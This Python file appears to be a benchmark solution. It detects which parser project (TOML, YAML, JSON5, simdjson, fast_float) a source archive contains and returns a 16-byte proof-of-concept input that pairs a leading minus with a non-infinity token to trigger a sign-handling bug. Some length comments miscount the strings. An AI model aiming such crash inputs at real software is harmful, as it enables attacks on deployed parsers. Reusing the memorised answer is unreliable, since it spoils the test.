import os
import tarfile
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def detect_project(path: str) -> str:
            try:
                names = []
                if tarfile.is_tarfile(path):
                    with tarfile.open(path, 'r:*') as tf:
                        names = [m.name.lower() for m in tf.getmembers() if m.isfile() or m.isdir()]
                elif zipfile.is_zipfile(path):
                    with zipfile.ZipFile(path, 'r') as zf:
                        names = [n.lower() for n in zf.namelist()]
                else:
                    if os.path.isdir(path):
                        for root, _, files in os.walk(path):
                            for f in files:
                                names.append(os.path.join(root, f).lower())
                text_markers = []
                for n in names:
                    base = os.path.basename(n)
                    text_markers.append(base)
                    parts = n.split('/')
                    text_markers.extend(parts)
                s = " ".join(text_markers)
                if "fast_float" in s or "fastfloat" in s:
                    return "fast_float"
                if "toml" in s or "toml++" in s or "toml11" in s:
                    return "toml"
                if "yaml" in s or "libyaml" in s or "fyaml" in s:
                    return "yaml"
                if "json5" in s or "hjson" in s:
                    return "json5"
                if "yyjson" in s:
                    return "yyjson"
                if "simdjson" in s:
                    return "simdjson"
                return "unknown"
            except Exception:
                return "unknown"

        project = detect_project(src_path)

        # Heuristic PoCs tailored to likely projects that parse -inf/-infinity with sign handling.
        if project == "toml":
            # Minimal TOML: key/value with problematic leading minus and non-infinity token.
            # Keep total length at or near 16 bytes.
            # "a=-i#x\n" is 8; pad with benign chars to reach 16
            poc = b"a=-i#xxxxxxx\n"  # 12
            poc = (poc + b"x" * (16 - len(poc)))[:16]
            return poc
        if project == "yaml":
            # YAML special floats are .inf/.nan; craft wrong token with leading minus
            # and non-matching sequence so sign is consumed improperly.
            poc = b"-.ixxxxxxxxxxxx"[:16]
            return poc
        if project in ("json5", "yyjson", "simdjson"):
            # JSON5 allows Infinity; craft a non-Infinity after '-' to hit sign handling.
            # e.g., top-level value: -Ixxxxxxxxxxxxx (not "Infinity")
            poc = b"-Ixxxxxxxxxxxxxx"[:16]
            return poc
        if project == "fast_float":
            # fast_float from_chars special-case for inf/nan with optional sign.
            # Provide '-' followed by non-infinity sequence to tickle the bug.
            poc = b"-ixxxxxxxxxxxxxx"[:16]
            return poc

        # Fallback generic PoC focused on leading '-' followed by non-matching "inf"
        return (b"-i" * 8)[:16]